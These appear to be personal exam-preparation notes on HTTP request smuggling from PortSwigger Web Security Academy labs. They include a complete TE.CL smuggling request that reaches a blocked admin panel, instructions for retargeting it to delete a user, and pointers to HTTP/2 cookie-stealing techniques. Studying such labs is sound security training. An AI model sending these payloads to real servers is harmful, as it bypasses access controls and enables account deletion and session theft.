
Actually, this is stage 1 or 2 because can use these to get carlos's session cookie (stage 1) and get admin's cookie or admin panel (stage 2).

![HTTP Request Smuggling (Stage 2)-20260222164701525](HTTP%20Request%20Smuggling%20%28Stage%202%29-20260222164701525.png)

Admin is blocked

Http Request Smuggler > Smuggle Probe **Only on `GET /` request**
Possible HTTP Request Smuggling: TE.CL multiCase （delayed response）
- [TE](TE.CL#1.4.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20TE.CL%20vulnerability%20%E2%AD%95%EF%B8%8F)

```
POST / HTTP/1.1
Host: 0a31007604b5b2c080bd2bda00e9008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

![HTTP Request Smuggling (Stage 2)-20260222164637024](HTTP%20Request%20Smuggling%20%28Stage%202%29-20260222164637024.png)

Change from `/admin` to `/admin/delete?username=carlos` will require to change the `71` to `88` or whatever the hex number is when you highlight the smuggled request.


---
![HTTP Request Smuggling (Stage 2)-20260222165701891](HTTP%20Request%20Smuggling%20%28Stage%202%29-20260222165701891.png)
HTTP Request Smuggler > HTTP/2 Probe > revealed to be vulnerable to **HTTP/2 TE desync**.
HTTP/2 TE desync v10a options
cookie stealer - [HTTP2](HTTP2.md#1.8.%20Lab%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling%20%E2%AD%95%EF%B8%8F)
cookie stealer - [HTTP2](HTTP2.md#1.10.%20Lab%20HTTP%2F2%20request%20smuggling%20via%20CRLF%20injection%20%E2%AD%95%EF%B8%8F)


---

Possible HTTP Request Smuggling: CL.TE options （delayed response）
- **Bypass Admin (Stage 2)** [CL](CL.TE#1.3.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability%20%E2%AD%95%EF%B8%8F)
- https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main?tab=readme-ov-file#clte-multicase---admin-blocked


